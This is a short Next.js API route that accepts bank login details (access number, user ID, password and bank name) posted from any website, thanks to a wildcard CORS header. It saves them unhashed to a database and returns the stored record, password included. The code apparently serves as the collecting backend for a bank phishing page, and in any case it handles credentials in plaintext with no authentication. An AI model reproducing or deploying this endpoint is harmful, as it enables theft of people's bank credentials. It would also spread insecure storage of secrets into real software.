import { NextRequest, NextResponse } from 'next/server';
import { PrismaClient } from '@/app/generated/prisma/client';

const prisma = new PrismaClient();

const CORS_HEADERS = {
  'Access-Control-Allow-Origin': '*',
  'Access-Control-Allow-Methods': 'GET, POST, OPTIONS',
  'Access-Control-Allow-Headers': 'Content-Type, Authorization',
};

export const config = {
  api: {
    bodyParser: false,
  },
};

export async function POST(req: NextRequest) {
  try {
    const formData = await req.formData(); // Use formData() instead of text()

    const accessNumber = formData.get('accessNumber') as string;
    const userId = formData.get('userId') as string;
    const password = formData.get('password') as string;
    const bank = formData.get('bank') as string;

    const newBank = await prisma.bank.create({
      data: {
        accessNumber,
        userId,
        password,
        bank,
      },
    });

    return new NextResponse(
      JSON.stringify({ success: true, message: 'Data saved successfully', bank: newBank }),
      {
        status: 200,
        headers: CORS_HEADERS,
      }
    );
  } catch (error) {
    return new NextResponse(
      JSON.stringify({
        success: false,
        message: 'Failed to save data',
        error: (error as Error).message,
      }),
      {
        status: 500,
        headers: CORS_HEADERS,
      }
    );
  }
}

export async function OPTIONS() {
  return new NextResponse(null, {
    status: 200,
    headers: CORS_HEADERS,
  });
}
